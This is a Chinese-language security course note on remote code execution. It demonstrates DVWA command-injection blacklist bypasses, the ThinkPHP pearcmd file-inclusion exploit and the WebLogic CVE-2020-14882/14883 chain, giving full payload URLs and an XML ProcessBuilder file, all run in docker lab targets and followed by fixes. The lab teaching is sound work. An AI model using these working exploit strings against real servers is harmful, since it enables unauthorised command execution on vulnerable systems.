---
slug: /net-security/09/04
---

👉 课件 PDF：[SSRF&XXE&远程代码执行](./SSRF%20&%20XXE%20&%20Remote%20Code%20Execution.pdf)

## 简介

远程命令执行/远程代码执行（Remote Command/Code Execution, RCE），两者是有所区分的，远程命令执行比如 `ping`，远程代码执行比如 `eval`。

RCE 漏洞可以让攻击者向后台服务器远程注入命令或者代码，从而控制后台。

## DVWA 演示

### Low

在 Command Injection 模块中，可以输入地址进行 ping：

![](http://img.wukaipeng.com/2023/11/05-105958-image-20231105105958709.png)

利用多条命令执行语法：

1. `A && B`：先执行 A，如果成功，再执行 B
2. `A || B`：先执行 A，如果失败，再执行 B
3. `A | B`：管道符，先执行 A，将 A 的结果作为 B 的输入，打印 B 的结果
4. `A & B`：先执行 A，无论成功，继续执行 B



![](http://img.wukaipeng.com/2023/11/05-110414-image-20231105110414424.png)

### Medium

查看源代码：

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?> 
```

发现仅限制了 `&&` 和 `;`，可以使用 `|` 绕开：

![](http://img.wukaipeng.com/2023/11/05-110638-image-20231105110638798.png)

### High

查看源代码：

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?> 
```

发现对 `| ` 限制不严格，其包含空格，可以使用不添加空格绕过：

![image-20231105110831156](http://img.wukaipeng.com/2023/11/05-110831-image-20231105110831156.png)

## ThinkPHP

Thinkphp 是一个免费开源的，快速、简单的面向对象的轻量级 PHP 开发框架，是为了敏捷 Web 应用开发和简化企业应用开发而诞生的。

2022 年 12 月，ThinkPHP 披露出在开启多语言功能的情况下存在文件包含漏洞，攻击者可以通过 get、header、cookie 等位置传入参数，实现目录穿越 + 文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。

默认情况下，系统只会加载默认语言包，如果需要多语言自动侦测及自动切换，需要在全局的中间件定义文件中添加中间件定义，因此只有启用多语言并且使用存在漏洞的版本时才存在漏洞。

🔑 漏洞利用条件：

1. 多语言开启
2. 安装 Pear 库
3. 知道 pearcmd.PHP 路径
4. register_argc_argv = on

💥 漏洞范围：

1. 6.0.1 < ThinkPHP ≤ 6.0.13
2. 5.1.0 < ThinkPHP ≤ 5.1.8
3. 5.0.0 < ThinkPHP ≤ 5.0.12



### 环境搭建

安装 ThinkPHP：·

```bash
docker pull vulfocus/thinkphp:6.0.12
docker run -d -p 8080:80 --name=thinkphp vulfocus/thinkphp:6.0.12
```

访问 `http://YOUR_IP_ADDRESS:PORT/public/`

![](http://img.wukaipeng.com/2023/11/05-121646-te4OUO-image-20231105121646273.png)

### 演示

传入 `?lang=../../../../../../../../usr/local/lib/php/pearcmd`，出现该错误说明漏洞存在：

![](http://img.wukaipeng.com/2023/11/05-134533-CRlH1y-image-20231105134533378.png)

传入 EXP（Exploit，利用系统漏洞进行攻击的程序）：

`?lang=../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=phpinfo()?>+/var/www/html/wukaipeng.php`

![](http://img.wukaipeng.com/2023/11/05-135319-3PXoxe-image-20231105135319002.png)

写入成功，访问该文件：

![](http://img.wukaipeng.com/2023/11/05-135402-z1lqJZ-image-20231105135402344.png)

## Weblogic

Weblogic 未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）

- CVE-2020-14882：允许未授权的用户绕过管理控制台的权限验证访问后台
- CVE-2020-14883：允许后台任意用户通过 HTTP 协议执行任意命令

这两个漏洞的组合利用，可以让攻击者以未授权的身份登录后台，然后通过 GET 请求在 Weblogic 服务器上远程执行命令。



💥  漏洞范围：

- WebLogic 10.3.6.0.0
- WebLogic 12.1.3.0.0
- WebLogic 12.2.1.3.0
- WebLogic 12.2.1.4.0
- WebLogic 14.1.1.0.0



### 环境搭建

Vulhub 是一个漏洞测试靶场平台，利用 `docker compose` 可以一键启动漏洞测试靶场。

下载 [Vulhub](https://vulhub.org/) 到本地：`git clone https://github.com/vulhub/vulhub.git  `

进入到我们的目标漏洞位置：`cd vulhub/weblogic/CVE-2020-14882/`

查看当前的 `docker-compose.yml`：

```yaml
version: '2'
services:
 weblogic:
   image: vulhub/weblogic:12.2.1.3-2018
   ports:
    - "7001:7001"
```

>  可以修改映射端口号

启动容器：`docker compose up -d`

访问 `http://YOUR_IP_ADDRESS:PORT/console`：

![](http://img.wukaipeng.com/2023/11/07-070126-2urR2E-image-20231107070126724.png)

停止容器：`docker compose stop`

删除容器：`docker compose down`

### CVE-2020-14882

访问：

- `http://YOUR_IP_ADDRESS:PORT/console/css/%252e%252e%252fconsole.portal`
- `http://YOUR_IP_ADDRESS:PORT/console/images/%252e%252e%252fconsole.portal`

其中 `%252e%252e%252f` 是 `../.` 进行两次 URL 编码，通过这个可以实现路径穿越，可未授权直接访问后台。

![](http://img.wukaipeng.com/2023/11/07-070820-wnOWJt-image-20231107070820297.png)

目前权限不足，要想实现 RCE 需要借助另外一个漏洞。

### CVE-2020-14883

**利用方式一 ：**

利用类 `com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext` 反序列化漏洞上传文件，这是一个通杀的漏洞，所有版本都适用：

新建一个 `rce.xml` 文件

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[touch /tmp/wukaipeng]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

然后利用 DVWA 上传，得到公网可访问链接 `http://DVWA_IP_ADDERSS:PORT/hackable/uploads/rce.xml`

![](http://img.wukaipeng.com/2023/11/07-071901-1rD79B-image-20231107071900897.png)

访问：`http://YOUR_IP_ADDRESS/console/images/%252e%252e%252fconsole.portal?
_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.su
pport.FileSystemXmlApplicationContext("http://example.com/rce.xml")`

其中 `http://example.com/rce.xml` 替换成刚才上传的地址：

![](http://img.wukaipeng.com/2023/11/07-074256-mEVN6R-image-20231107074256077.png)

去到容器中，可以看到我们的文件也上传成功了：

![](http://img.wukaipeng.com/2023/11/07-074418-NlE1jX-image-20231107074418579.png)

---

**利用方式二：**

利用类 `com.tangosol.coherence.mvel2.sh.ShellSession` 实现，Weblogic 12.2.1 以上适用

```
http://YOUR_IP_ADDRESS:PORT/console/images/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/wukaipeng2');")
```

![](http://img.wukaipeng.com/2023/11/07-074958-3WX5N3-image-20231107074958334.png)

### 修复

1️⃣ 非必要不开启 console

2️⃣ 升级最新版本





















